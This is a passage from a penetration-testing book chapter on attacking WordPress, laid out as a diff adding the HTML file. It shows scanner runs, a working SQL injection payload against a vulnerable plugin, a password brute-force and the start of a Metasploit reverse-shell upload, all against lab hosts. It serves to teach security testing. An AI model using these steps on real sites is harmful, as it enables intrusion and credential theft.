@@ -1,0 +1,523 @@
+<html><head></head><body><div class="chapter" title="Chapter&#xA0;12.&#xA0;Attacking CMS"><div class="titlepage"><div><div><h1 class="title"><a id="ch12"/>Chapter 12. Attacking CMS</h1></div></div></div><p>In this chapter, we will discuss attacking CMSs and WordPress in particular. It's hard to talk about web applications and not mention WordPress. WordPress is so common on the internet that you will likely come across many instances of it in your career. After all, almost a third of all websites are running on the platform and it is by far the most popular CMS.</p><p>There are alternatives to WordPress, including Drupal, Joomla, and other more modern applications, such as Ghost. All of these frameworks aim to make content publishing on the web easy and hassle free. You don't need to know JavaScript, HTML, PHP, or any other technology to get going. CMSs are generally extensible through plugins and highly customizable through themes. What sets WordPress apart is the sheer volume of installs across the internet. You are far more likely to come across a WordPress blog than a Ghost blog, for example.</p><p>Attackers love WordPress because the very thing that sets it apart from the competition — a massive community — also makes it difficult to secure. The reason WordPress has the lion's share of the market is because users don't need technical expertise to operate a foodie blog, and therein lies the problem. Those same non-technical users are less likely to update plugins or apply core patches, let alone harden their WordPress instance, and will not stray from that baseline through the years.</p><p>To be fair, auto-update has been added to WordPress as of version 3.7, but that is only effective if users actually update to version 3.7. It should also be noted that even with auto-update functionality, for change management's sake, some companies may choose to opt out to maintain stability, at the expense of security.</p><p>Enterprises love WordPress and there are several companies that provide shared hosting and management as well. It's also not unusual to have someone in marketing set up a rogue instance that the security department is unaware of, and leave it running for years.</p><p>It's easy to pick on WordPress, but Drupal and Joomla make great targets as well. They suffer from the same problems with vulnerable plugins and themes, and seldomly updated installations. WordPress is the Goliath and we will focus our attention on it, but the attack methodology will translate to any content management framework, albeit the tools may differ slightly.</p><p>In the coming pages, we will look at WordPress attacks in depth and by the end, you should be comfortable with the following:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Testing WordPress with various tools</li><li class="listitem" style="list-style-type: disc">Setting up persistence within the WordPress code once you get access</li><li class="listitem" style="list-style-type: disc">Backdooring WordPress to harvest credentials and other interesting data</li></ul></div><div class="section" title="Application assessment"><div class="titlepage"><div><div><h1 class="title"><a id="ch12lvl1sec66"/>Application assessment</h1></div></div></div><p>Just as we've done with other<a id="id620" class="indexterm"/> applications, when we come across a WordPress or CMS instance, we have to do some reconnaissance: look for low-hanging fruit and try to understand what we're up against. There are a few tools to get us going and we will look at a common scenario where they can help us to identify issues and exploit them.</p><div class="section" title="WPScan"><div class="titlepage"><div><div><h2 class="title"><a id="ch12lvl2sec62"/>WPScan</h2></div></div></div><p>The first thing attackers <a id="id621" class="indexterm"/>reach for when they encounter a WordPress CMS<a id="id622" class="indexterm"/> application is usually WPScan. It is a well-built and frequently updated tool used to discover vulnerabilities and even guess credentials.</p><p>WPScan has many useful features,<a id="id623" class="indexterm"/> including the following:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Plugin and theme enumeration:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Passive and active discovery</li></ul></div></li><li class="listitem" style="list-style-type: disc">Username enumeration</li><li class="listitem" style="list-style-type: disc">Credential brute-forcing</li><li class="listitem" style="list-style-type: disc">Vulnerability scanning</li></ul></div><p>A useful feature for assessments is the ability to pass all of its requests through a proxy, such as a local Burp Suite instance. This allows us to see the attack live and replay some of the payloads. During an engagement, this may be useful for recording activities and even passing in a polyglot or two.</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# wpscan --url http://cookingwithfire.local/ --proxy 127.0.0.1:8080</strong></span>
+</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note73"/>Note</h3><p>Using an upstream proxy with WPScan can generate a ton of data in Burp's proxy history, especially when performing a credential attack or active scan.</p></div></div><p>Proxying our scan<a id="id624" class="indexterm"/> through Burp gives us some control over the outgoing <a id="id625" class="indexterm"/>connections:</p><div class="mediaobject"><img src="graphics/B09238_12_01.jpg" alt="WPScan"/><div class="caption"><p>Figure 12.1: Burp capturing WPScan web requests</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note74"/>Note</h3><p>The default user agent (WPScan vX.X.X) can be changed with the <code class="literal">--user-agent</code> switch or randomized with <code class="literal">--random-agent</code>.</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note75"/>Note</h3><p>WPScan is available on Kali<a id="id626" class="indexterm"/> and most penetration testing distributions. It can also be found on <a class="ulink" href="https://wpscan.org/">https://wpscan.org/</a> or cloned from GitHub: <a class="ulink" href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a>.</p></div></div><p>A typical <a id="id627" class="indexterm"/>engagement begins with a passive scan of the target using the <code class="literal">--url</code> parameter. The following command will launch a default scan on the <code class="literal">cookingwithfire.local</code> test blog:</p><div class="informalexample"><pre class="programlisting">root@kali:~#<span class="strong"><strong> wpscan --url http://cookingwithfire.local/</strong></span>
+<span class="strong"><strong>_______________________________________________________________</strong></span>
+<span class="strong"><strong>        __          _______   _____                  </strong></span>
+<span class="strong"><strong>        \ \        / /  __ \ / ____|                 </strong></span>
+<span class="strong"><strong>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</strong></span>
+<span class="strong"><strong>          \ \/  \/ / |  ___/ \___ \ / __|/ _' | '_ \ </strong></span>
+<span class="strong"><strong>           \  /\  /  | |     ____) | (__| (_| | | | |</strong></span>
+<span class="strong"><strong>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</strong></span>
+
+<span class="strong"><strong>        WordPress Security Scanner by the WPScan Team</strong></span>
+<span class="strong"><strong>                       Version 2.9.3</strong></span>
+<span class="strong"><strong>          Sponsored by Sucuri - https://sucuri.net</strong></span>
+<span class="strong"><strong>   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</strong></span>
+<span class="strong"><strong>_______________________________________________________________</strong></span>
+
+[+] URL: http://cookingwithfire.local/
+
+<span class="strong"><strong>[!] The WordPress 'http://cookingwithfire.local/readme.html' file exists exposing a version number</strong></span>
+<span class="strong"><strong>[!] Full Path Disclosure (FPD) in 'http://cookingwithfire.local/wp-includes/rss-functions.php':</strong></span>
+[+] Interesting header: LINK: &lt;http://cookingwithfire.local/index.php?rest_route=/&gt;; rel="https://api.w.org/"
+[+] Interesting header: SERVER: Apache/2.4.25 (Debian)
+[+] Interesting header: X-POWERED-BY: PHP/7.2.3
+[+] XML-RPC Interface available under: http://cookingwithfire.local/xmlrpc.php
+
+[+] WordPress version 4.9.4 (Released on 2018-02-06) identified from meta generator, links opml
+<span class="strong"><strong>[!] 1 vulnerability identified from the version number</strong></span>
+
+<span class="strong"><strong>[!] Title: </strong></span>
+<span class="strong"><strong>WordPress &lt;= 4.9.4 - Application Denial of Service (DoS) (unpatched)</strong></span>
+    Reference: https://wpvulndb.com/vulnerabilities/9021
+    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
+    Reference: https://github.com/quitten/doser.py
+    Reference: https://thehackernews.com/2018/02/WordPress-dos-exploit.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
+
+[+] WordPress theme in use: kale - v2.2
+
+[+] Name: kale - v2.2
+ |  Latest version: 2.2 (up to date)
+ |  Last updated: 2018-03-11T00:00:00.000Z
+ |  Location: http://cookingwithfire.local/wp-content/themes/kale/
+ |  Readme: http://cookingwithfire.local/wp-content/themes/kale/readme.txt
+ |  Changelog: http://cookingwithfire.local/wp-content/themes/kale/changelog.txt
+ |  Style URL: http://cookingwithfire.local/wp-content/themes/kale/style.css
+ |  Theme Name: Kale
+ |  Theme URI: https://www.lyrathemes.com/kale/
+ |  Description: Kale is a charming and elegant, aesthetically minimal and uncluttered food blog theme that can al...
+ |  Author: LyraThemes
+ |  Author URI: https://www.lyrathemes.com/
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found
+
+[+] Requests Done: 348
+[+] Memory used: 41.449 MB
+[+] Elapsed time: 00:00:03
+root@kali:~#</pre></div><p>At first glance, it <a id="id628" class="indexterm"/>appears there isn't much we can use for exploitation. There is a full-path disclosure vulnerability, which may come in handy if we need to find a place to drop a shell, for example. The <span class="strong"><strong>denial-of-service</strong></span> (<span class="strong"><strong>DoS</strong></span>) bug is not very interesting, as the majority of clients will not allow this type of exploitation, but it may be good to mention in the report as a possible route for disruption.</p><p>By default, WPScan performs a passive enumeration of plugins. This basically means that it will only detect a plugin if it is referenced somewhere on the site. If a plugin is disabled or more inconspicuous, we may need to execute an active enumeration.</p><p>Active scans will<a id="id629" class="indexterm"/> test whether known plugin files are present in the <code class="literal">wp-content</code> folder and alert on any existing vulnerabilities. This is done by sending a ton of URL requests to known paths and if there's a response, WPScan assumes the plugin is available.</p><p>To specify the type of scan we want to conduct, the <code class="literal">--enumerate</code> (<code class="literal">-e</code> for short) switch accepts several parameters for active detection:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc"><code class="literal">u</code> – Look for usernames with IDs from 1 to 10</li><li class="listitem" style="list-style-type: disc"><code class="literal">u[10-20]</code> – Look for usernames with IDs from 10 to 20: <code class="literal">--enumerate u[15]</code></li><li class="listitem" style="list-style-type: disc"><code class="literal">p</code> – Look for popular plugins</li><li class="listitem" style="list-style-type: disc"><code class="literal">vp</code> – Show me only vulnerable plugins</li><li class="listitem" style="list-style-type: disc"><code class="literal">ap</code> – Look for all known plugins</li><li class="listitem" style="list-style-type: disc"><code class="literal">tt</code> – Search for timthumbs</li><li class="listitem" style="list-style-type: disc"><code class="literal">t</code> – Enumerate popular themes</li><li class="listitem" style="list-style-type: disc"><code class="literal">vt</code> – Show me only vulnerable themes</li><li class="listitem" style="list-style-type: disc"><code class="literal">at</code> – Look for all known themes</li></ul></div><p>You can also provide multiple <code class="literal">--enumerate</code> (or <code class="literal">-e</code>) switches to enumerate themes, plugins, and usernames all in one shot. For example, this combination of switches will perform a fairly thorough scan:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# wpscan --url [url] -e ap -e at -e u</strong></span>
+</pre></div><p>Let's go ahead and start an active enumeration of available plugins on our target:</p><div class="informalexample"><pre class="programlisting">root@kali:~# wpscan --url http://cookingwithfire.local/ <span class="strong"><strong>--enumerate p</strong></span>
+[...]
+[+] URL: http://cookingwithfire.local/
+[...]
+[+] Enumerating installed plugins (only ones marked as popular) ...
+[...]
+
+[+] Name: google-document-embedder - v2.5
+ |  Last updated: 2018-01-10T16:02:00.000Z
+ |  Location: http://cookingwithfire.local/wp-content/plugins/google-document-embedder/
+ |  Readme: http://cookingwithfire.local/wp-content/plugins/google-document-embedder/readme.txt
+<span class="strong"><strong>[!] The version is out of date, the latest version is 2.6.4</strong></span>
+
+<span class="strong"><strong>[!] Title: Google Document Embedder 2.4.6 - pdf.php file Parameter Arbitrary File Disclosure</strong></span>
+    Reference: https://wpvulndb.com/vulnerabilities/6073
+    Reference: http://www.securityfocus.com/bid/57133/
+    Reference: http://packetstormsecurity.com/files/119329/
+    Reference: http://ceriksen.com/2013/01/03/WordPress-google-document-embedder-arbitrary-file-disclosure/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4915
+    Reference: https://secunia.com/advisories/50832/
+    Reference: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_google_document_embedder_exec
+    Reference: https://www.exploit-db.com/exploits/23970/
+[i] Fixed in: 2.5.4
+
+<span class="strong"><strong>[!] Title: Google Document Embedder &lt;= 2.5.14 - SQL Injection</strong></span>
+    Reference: https://wpvulndb.com/vulnerabilities/7690
+    Reference: http://security.szurek.pl/google-doc-embedder-2514-sql-injection.html
+    Reference: https://exchange.xforce.ibmcloud.com/vulnerabilities/98944
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9173
+    Reference: https://www.exploit-db.com/exploits/35371/
+[i] Fixed in: 2.5.15
+
+<span class="strong"><strong>[!] Title:  Google Document Embedder &lt;= 2.5.16 - SQL Injection</strong></span>
+    Reference: https://wpvulndb.com/vulnerabilities/7704
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9173
+    Reference: https://www.exploit-db.com/exploits/35447/
+[i] Fixed in: 2.5.17
+
+<span class="strong"><strong>[!] Title: Google Doc Embedder &lt;= 2.5.18 - Cross-Site Scripting (XSS)</strong></span>
+    Reference: https://wpvulndb.com/vulnerabilities/7789
+    Reference: http://packetstormsecurity.com/files/130309/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1879
+[i] Fixed in: 2.5.19
+
+[+] Requests Done: 1766
+[+] Memory used: 123.945 MB
+[+] Elapsed time: 00:00:10
+root@kali:~#</pre></div><p>It appears <span class="strong"><strong>Google Document Embedder</strong></span> was enumerated successfully and there are several critical vulnerabilities with proof of concept code publicly available.</p><p>The SQLi flaw tagged with <code class="literal">CVE-2014-9173</code> has a PoC on <a class="ulink" href="https://www.exploit-db.com">https://www.exploit-db.com</a>, which on Kali can be queried locally through <code class="literal">searchsploit</code>. This is a simple tool that searches the <a id="id630" class="indexterm"/>Kali local directory <code class="literal">/usr/share/exploitdb/</code>. This folder is frequently mirrored to the online database and it's useful in environments where maybe the internet is not easily accessible.</p><p>We can invoke <code class="literal">searchsploit</code> from the command-line with a search query as the first parameter, as shown:</p><div class="mediaobject"><img src="graphics/B09238_12_02.jpg" alt="WPScan"/><div class="caption"><p>Figure 12.2: searchsploit results for Google Document Embedder</p></div></div><p>
+<code class="literal">searchsploit</code> will list the <code class="literal">Exploit Title</code> and the associated <code class="literal">Path</code>, which is relative to <code class="literal">/usr/share/exploitdb/</code> on Kali distributions.</p><p>In the PoC document <code class="literal">/usr/share/exploitdb/exploits/php/webapps/35371.txt</code>, researcher Kacper Szurek identifies the <code class="literal">gpid</code> URL parameter in the <code class="literal">wp-content/plugins/google-document-embedder/view.php</code> plugin file as the injection point.</p></div><div class="section" title="sqlmap"><div class="titlepage"><div><div><h2 class="title"><a id="ch12lvl2sec63"/>sqlmap</h2></div></div></div><p>In order to confirm this<a id="id631" class="indexterm"/> vulnerability in our target, we can jump to sqlmap, the de facto SQLi exploitation tool. sqlmap will help us to quickly generate payloads to test for <a id="id632" class="indexterm"/>injection in all of the<a id="id633" class="indexterm"/> popular <span class="strong"><strong>Database Management Systems</strong></span> (<span class="strong"><strong>DBMS</strong></span>), such as MySQL, PostgreSQL, MS SQL, and even Microsoft Access. To launch a new sqlmap session, we pass our full target URL via the <code class="literal">-u</code> parameter.</p><p>Notice that the target URL includes the <code class="literal">GET</code> query parameters as well, with some dummy data. If we don't tell sqlmap to target <code class="literal">gpid</code>, it will check every other parameter for injection as well. It makes for a great SQLi discovery, not just exploitation. Thanks to our <code class="literal">searchsploit</code> query, we know <code class="literal">gpid</code> is the vulnerable parameter and we can focus our attack on it specifically, with the <code class="literal">-p</code> parameter.</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# sqlmap -u "http://cookingwithfire.local/wp-content/plugins/google-document-embedder/view.php?embedded=1&amp;gpid=0" -p gpid</strong></span>
+
+<span class="strong"><strong>[*] starting at 10:07:41</strong></span>
+
+<span class="strong"><strong>[10:07:41] [INFO] testing connection to the target URL</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+</pre></div><p>After a few minutes, sqlmap detects the backend to be MySQL and we can tell it to only check MySQL payloads against our target. This will greatly improve our chances of confirming the vulnerability.</p><div class="informalexample"><pre class="programlisting">[10:07:49] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'
+[10:07:49] [INFO]<span class="strong"><strong> GET parameter 'gpid' is 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)' injectable</strong></span>
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y</pre></div><p>For the remaining tests, sqlmap will confirm the existence of the vulnerability and save the state locally. Subsequent attacks on the target will use the identified payload as a starting point to inject SQL statements.</p><div class="informalexample"><pre class="programlisting">for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+[10:07:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+<span class="strong"><strong>GET parameter 'gpid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n</strong></span>
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: gpid (GET)
+    Type:<span class="strong"><strong> error-based</strong></span>
+    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
+    Payload:<span class="strong"><strong> embedded=1&amp;gpid=(SELECT 1349 FROM(SELECT COUNT(*),CONCAT(0x716b6a7171,(SELECT (ELT(1349=1349,1))),0x716b6a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</strong></span>
+<span class="strong"><strong>---</strong></span>
+<span class="strong"><strong>[10:08:07] [INFO] the back-end DBMS is MySQL</strong></span>
+<span class="strong"><strong>web server operating system: Linux Debian</strong></span>
+<span class="strong"><strong>web application technology: Apache 2.4.25, PHP 7.2.3</strong></span>
+<span class="strong"><strong>back-end DBMS: MySQL &gt;= 5.0</strong></span>
+<span class="strong"><strong>[10:08:07] [INFO] fetched data logged to text files under '/root/.sqlmap/output/cookingwithfire.local'</strong></span>
+
+<span class="strong"><strong>[*] shutting down at 10:08:07</strong></span>
+
+<span class="strong"><strong>root@kali:~#</strong></span>
+</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note76"/>Note</h3><p>If you want to test this vulnerable plugin in your own WordPress instance, you can download version 2.5 of the Google Document Embedder plugin from <a class="ulink" href="https://github.com/wp-plugins/google-document-embedder/tags?after=2.5.1">https://github.com/wp-plugins/google-document-embedder/tags?after=2.5.1</a>.</p></div></div></div><div class="section" title="Droopescan"><div class="titlepage"><div><div><h2 class="title"><a id="ch12lvl2sec64"/>Droopescan</h2></div></div></div><p>Although not as fully-featured <a id="id634" class="indexterm"/>as WPScan, droopescan does support more than<a id="id635" class="indexterm"/> just WordPress as a scanning target. It is ideal for Drupal instances and it can also do some basic scanning for Joomla.</p><p>Droopescan can be cloned from GitHub and quickly installed:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~/tools# git clone https://github.com/droope/droopescan</strong></span>
+<span class="strong"><strong>Cloning into 'droopescan'...</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>root@kali:~/tools# cd droopescan/</strong></span>
+<span class="strong"><strong>root@kali:~/tools/droopescan# ls</strong></span>
+<span class="strong"><strong>CHANGELOG  droopescan  dscan  LICENSE  MANIFEST.in  README.md  README.txt  requirements_test.txt  requirements.txt  setup.cfg  setup.py</strong></span>
+</pre></div><p>Once extracted, we can install the dependencies manually using <code class="literal">pip</code> and passing in the <code class="literal">requirements.txt</code> option to <code class="literal">-r</code>:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~/tools/droopescan# pip install -r requirements.txt</strong></span>
+<span class="strong"><strong>Obtaining file:///root/tools/droopescan (from -r requirements.txt (line 3))</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>root@kali:~/tools/droopescan#</strong></span>
+</pre></div><p>Droopescan can also be installed globally using the <code class="literal">setup.py</code> script and the <code class="literal">install</code> parameter:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~/tools/droopescan# python setup.py install</strong></span>
+<span class="strong"><strong>Obtaining file:///root/tools/droopescan (from -r requirements.txt (line 3))</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>root@kali:~/tools/droopescan#</strong></span>
+</pre></div><p>To assess an application, droopescan<a id="id636" class="indexterm"/> can be launched with the <code class="literal">scan drupal</code> options and<a id="id637" class="indexterm"/> the target can be specified with the <code class="literal">-u</code> parameter:</p><div class="informalexample"><pre class="programlisting">root@kali:~# droopescan scan drupal -u http://ramblings.local -t 8
+[+] No themes found.
+
+[+] Possible interesting urls found:
+<span class="strong"><strong>    Default admin </strong></span>- http://ramblings.local/user/login
+
+[+] Possible version(s):
+<span class="strong"><strong>    8.5.0-rc1</strong></span>
+
+[+] No plugins found.
+
+[+] Scan finished (0:03:34.527555 elapsed)
+root@kali:~#</pre></div><p>This tool is a great start when looking at breaking into a Drupal, WordPress, or Joomla instance.</p></div><div class="section" title="Arachni web scanner"><div class="titlepage"><div><div><h2 class="title"><a id="ch12lvl2sec65"/>Arachni web scanner</h2></div></div></div><p>
+<span class="strong"><strong>Arachni</strong></span> is a bit different <a id="id638" class="indexterm"/>from the more specialized tools discussed earlier. It is<a id="id639" class="indexterm"/> a full-featured modular framework with the capability of distributing scans through remote agents. When it is properly configured, it can be a powerful first step in assessing applications.</p><p>Arachni is free and open-source, and easily installed. It can be controlled via an easy-to-use web user interface or via the command-line. The framework can also be used to find HTML5 and Document Object Model vulnerabilities, which traditional scanners may miss.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note77"/>Note</h3><p>Arachni pre-compiled<a id="id640" class="indexterm"/> binaries can be found on <a class="ulink" href="http://www.arachni-scanner.com/">http://www.arachni-scanner.com/</a>.</p></div></div><p>Once extracted to disk, we have to<a id="id641" class="indexterm"/> create a user to be able to log onto the web interface. The <code class="literal">arachni_web_create_user</code> helper utility can be found in the <code class="literal">bin</code> folder.</p><div class="informalexample"><pre class="programlisting">root@kali:~/tools/arachni/bin#<span class="strong"><strong> ./arachni_web_create_user root@kali.local A!WebOf-Lies* root</strong></span>
+User 'root' with e-mail address 'root@kali.local' created with password 'A!WebOf-Lies*'.
+root@kali:~/tools/arachni/bin#</pre></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note78"/>Note</h3><p>Take care to clear your shell history if this is a production installation of Arachni.</p></div></div><p>The web interface is launched using the <code class="literal">arachni_web</code> script in the same folder:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~/tools/arachni/bin# ./arachni_web</strong></span>
+<span class="strong"><strong>Puma 2.14.0 starting...</strong></span>
+<span class="strong"><strong>* Min threads: 0, max threads: 16</strong></span>
+<span class="strong"><strong>* Environment: development</strong></span>
+<span class="strong"><strong>* Listening on tcp://localhost:9292</strong></span>
+<span class="strong"><strong>::1 - - "GET /unauthenticated HTTP/1.1" 302 - 0.0809</strong></span>
+<span class="strong"><strong>[...]</strong></span>
+<span class="strong"><strong>::1 - - "GET /navigation HTTP/1.1" 304 - 0.0473</strong></span>
+<span class="strong"><strong>::1 - - "GET /profiles?action=index&amp;controller=profiles&amp;tab=global HTTP/1.1" 200 - 0.0827</strong></span>
+<span class="strong"><strong>::1 - - "GET /navigation HTTP/1.1" 304 - 0.0463</strong></span>
+</pre></div><p>The web user interface runs on <code class="literal">http://localhost:9292</code> by default. Here we can initiate a new scan immediately or schedule it for later. We can also create a scan profile or interact with a remote agent.</p><p>Arachni comes with three scanning profiles by default:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Default</li><li class="listitem" style="list-style-type: disc">Cross-Site Scripting (XSS)</li><li class="listitem" style="list-style-type: disc">SQL injection</li></ul></div><p>The Default profile performs a variety of checks and looks for interesting files and low-hanging fruit. XSS and SQL injection are more focused profiles for the two vulnerability types.</p><p>To launch a new scan using the web UI, select <span class="strong"><strong>New</strong></span> under <span class="strong"><strong>Scans</strong></span>, as shown:</p><div class="mediaobject"><img src="graphics/B09238_12_03.jpg" alt="Arachni web scanner"/><div class="caption"><p>Figure 12.3: Starting a new Arachni scan</p></div></div><p>We can also follow along as the<a id="id642" class="indexterm"/> scan is running by looking at the <span class="strong"><strong>Scans</strong></span> page. The following <a id="id643" class="indexterm"/>figure shows a sample scan running against <code class="literal">jimsblog.local</code>, a WordPress installation:</p><div class="mediaobject"><img src="graphics/B09238_12_04.jpg" alt="Arachni web scanner"/><div class="caption"><p>Figure 12.4: Arachni scan running</p></div></div><p>Issues are listed below the scan status as they are<a id="id644" class="indexterm"/> found, but a more complete report is available once the scan completes. Under the <span class="strong"><strong>Issues</strong></span> section, we can see what Arachni has discovered, as shown here:</p><div class="mediaobject"><img src="graphics/B09238_12_05.jpg" alt="Arachni web scanner"/><div class="caption"><p>Figure 12.5: Issues identified by Arachni</p></div></div><p>The SQL injection scan profile in <a id="id645" class="indexterm"/>Arachni can also be used in a scan to verify the issue we found <a id="id646" class="indexterm"/>earlier with WPScan, in the <code class="literal">cookingwithfire.local</code> blog. This particular profile should complete much faster than the default scan.</p><div class="mediaobject"><img src="graphics/B09238_12_06.jpg" alt="Arachni web scanner"/><div class="caption"><p>Figure 12.6: SQL injection found by Arachni</p></div></div><p>The keen eye will notice that Arachni found a time-based blind SQL injection where sqlmap was able to confirm the vulnerability using an error-based technique. Technically, both techniques can be used to exploit this particular application, but the error-based technique is preferred. Time-based injection attacks are inherently slow. If Arachni finds a time-based blind SQL injection vulnerability, it may be a good idea to aim sqlmap at the same URL and see whether anything more reliable can be identified.</p></div></div></div>
+<div class="section" title="Backdooring the code"><div class="titlepage"><div><div><h1 class="title"><a id="ch12lvl1sec67"/>Backdooring the code</h1></div></div></div><p>Once we obtain some <a id="id647" class="indexterm"/>access to a CMS instance, such as WordPress, Drupal, or Joomla, there are a couple of ways to persist or even escalate privileges horizontally or vertically. We can inject malicious PHP code, which will allow us to gain shell access at will. Code execution is great, but in some scenarios, we don't necessarily need it. There are other ways to exploit the application. Alternatively, we can modify the CMS core files to capture credentials in cleartext as users and administrators log in.</p><p>Both of these techniques <a id="id648" class="indexterm"/>require some kind of elevated privilege and that begs the question, why bother if we already have this type of access to the website? We'll look at a couple of situations where backdooring may help our engagement. If we have administrative access to the WordPress instance but no shell access, we can leverage the UI to spawn a reverse shell and persist access, should the password reset. If we have standard user shell access but not much else, capturing credentials in cleartext may be a great way to move laterally or escalate privileges.</p><div class="section" title="Persistence"><div class="titlepage"><div><div><h2 class="title"><a id="ch12lvl2sec66"/>Persistence</h2></div></div></div><p>When attacking CMS<a id="id649" class="indexterm"/> installations, such as WordPress, we may find ourselves with administrative credentials in hand. Maybe we successfully enumerated users with WPScan and subsequently brute-forced credentials for a privileged user. This is more common than you'd expect, especially in environments where WordPress is either temporarily stood up for development purposes or just brought up and forgotten.</p><p>Let's explore this scenario using the <code class="literal">--enumerate u</code> option for <code class="literal">wpscan</code>:</p><div class="informalexample"><pre class="programlisting">root@kali:~# wpscan --url http://cookingwithfire.local/ <span class="strong"><strong>--enumerate u</strong></span>
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found
+
+[+] Enumerating usernames ...
+[+] Identified the following 2 user/s:
+    +----+--------+--------+
+    | Id | Login  | Name   |
+    +----+--------+--------+
+    | 1  | msmith | msmith |
+    | 2  | mary   | Mary K |
+    +----+--------+--------+
+
+[+] Requests Done: 377
+[+] Memory used: 3.836 MB
+[+] Elapsed time: 00:00:10</pre></div><p>The results show us at least two users that we can target for a login brute-force attack. WPScan can brute-force the credentials for a particular account using the <code class="literal">--usernames</code> switch and a wordlist provided by <code class="literal">--passwords</code>.</p><p>For this attack, we will use SecLists' <code class="literal">rockyou-10.txt</code> wordlist and we'll target <code class="literal">mary</code>. As before, we can <a id="id650" class="indexterm"/>invoke <code class="literal">wpscan</code> with the <code class="literal">--url</code> parameter, then we will specify a username and point the <code class="literal">passwords</code> parameter to the <code class="literal">rockyou-10.txt</code> file from SecLists.</p><div class="informalexample"><pre class="programlisting">root@kali:~# wpscan --url http://cookingwithfire.local/ --usernames mary  --passwords ~/tools/SecLists/Passwords/Leaked-Databases/rockyou-10.txt
+
+[+] Starting the password brute forcer
+[+] [SUCCESS] Login : mary Password :<span class="strong"><strong> spongebob</strong></span>
+
+  Brute Forcing 'mary' Time: 00:00:01 &lt;===============    &gt; (87 / 93) 93.54%  ETA: 00:00:00
+  +----+-------+------+-----------+
+  | Id | Login | Name | Password  |
+  +----+-------+------+-----------+
+  |    | mary  |      |<span class="strong"><strong> spongebob </strong></span>|
+  +----+-------+------+-----------+
+
+[+] Requests Done: 441
+[+] Memory used: 41.922 MB
+[+] Elapsed time: 00:00:12</pre></div><p>After a short while, the credentials for <code class="literal">mary</code> are confirmed and we are free to login as this user.</p><p>Logging in through the WordPress UI, we notice <code class="literal">mary</code> has elevated access to the blog. We can use this account to spawn a reverse shell, which will give us access to the underlying operating system.</p><p>We can accomplish this easily through either Metasploit or through the administrative panel itself. The Metasploit method is a bit noisy and if it fails, it may leave behind artifacts that could alert administrators if not cleaned up in time. In some situations, stealth is not paramount, however, and this module will work just fine.</p><p>The Metasploit module <code class="literal">wp_admin_shell_upload</code> will connect to the WordPress site and authenticate with the credentials we've just discovered. It will proceed to upload a malicious plugin, which will spawn a reverse Meterpreter shell to our attack machine.</p><p>On our Kali instance, as before, we can launch the Metasploit interface using the <code class="literal">msfconsole</code> command:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>root@kali:~# msfconsole -q</strong></span>
+</pre></div><p>Let's load the <code class="literal">wp_admin_shell_upload</code> exploit with the Metasploit <code class="literal">use</code> command, as follows:</p><div class="informalexample"><pre class="programlisting">
+<span class="strong"><strong>msf &gt; use exploit/unix/webapp/wp_admin_shell_upload</strong></span>
+<span class="strong"><strong>msf exploit(unix/webapp/wp_admin_shell_upload) &gt; options</strong></span>
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+ Name       Current Setting       Required  Description
+ ----       ---------------       --------  -----------
+ PASSWORD <span class="strong"><strong>  spongebob</strong></span>
+<span class="strong"><strong>       </strong></span>       yes       The WordPress password to authenticate with
+ Proxies                          no        A proxy chain of formattype:host:port[,type:host:port][...]
+ RHOST      cookingwithfire.local  yes        The target address
